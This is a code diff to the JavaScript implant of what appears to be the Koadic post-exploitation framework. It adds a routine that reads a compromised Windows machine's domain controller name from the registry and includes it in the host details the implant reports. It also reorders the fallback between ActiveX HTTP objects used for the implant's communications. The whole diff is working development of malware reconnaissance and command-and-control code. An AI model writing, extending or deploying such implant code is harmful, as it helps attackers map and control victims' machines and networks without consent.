@@ -137,6 +137,21 @@ Koadic.user.OS = function()
     return "Unknown";
 }
 
+Koadic.user.DC = function()
+{
+    try
+    {
+        var DC = Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName");
+        if (DC.length > 0)
+          return DC;
+    }
+    catch(e)
+    {
+    }
+    return "Unknown";
+
+}
+
 
 Koadic.user.info = function()
 {
@@ -148,6 +163,7 @@ Koadic.user.info = function()
 
     info += "~~~" + net.ComputerName;
     info += "~~~" + Koadic.user.OS();
+    info += "~~~" + Koadic.user.DC();
 
     return info;
 }
@@ -255,12 +271,12 @@ Koadic.http.create = function()
 
     try
     {
-       http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-       http.setTimeouts(30000, 30000, 30000, 0)
+        http = new ActiveXObject("Microsoft.XMLHTTP");
     }
     catch (e)
     {
-        http = new ActiveXObject("Microsoft.XMLHTTP");
+        http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+        http.setTimeouts(30000, 30000, 30000, 0)
     }
 
     return http;
